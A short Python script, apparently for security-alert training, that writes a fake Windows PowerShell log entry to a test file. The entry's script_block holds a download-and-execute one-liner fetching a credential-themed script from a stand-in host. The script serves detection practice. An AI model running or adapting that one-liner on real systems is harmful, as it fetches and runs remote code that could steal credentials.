#!/usr/bin/env python3
"""
Simulate an alert by generating fake log entries (for training).
Usage: python simulate_alert.py --alert 001
"""

import argparse
import json
import datetime

def simulate_alert_001():
    print("[*] Simulating alert 001: Suspicious PowerShell")
    log_entry = {
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "event_id": 4104,
        "script_block": "IEX(New-Object Net.WebClient).DownloadString('http://phishbox.com/cred.ps1')",
        "user": "CORP\\jdoe"
    }
    print(json.dumps(log_entry, indent=2))
    # Optionally append to a test log file
    with open("simulated_test.log", "a") as f:
        f.write(json.dumps(log_entry) + "\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--alert", choices=["001", "002", "003"], required=True)
    args = parser.parse_args()
    if args.alert == "001":
        simulate_alert_001()
    # Add others similarly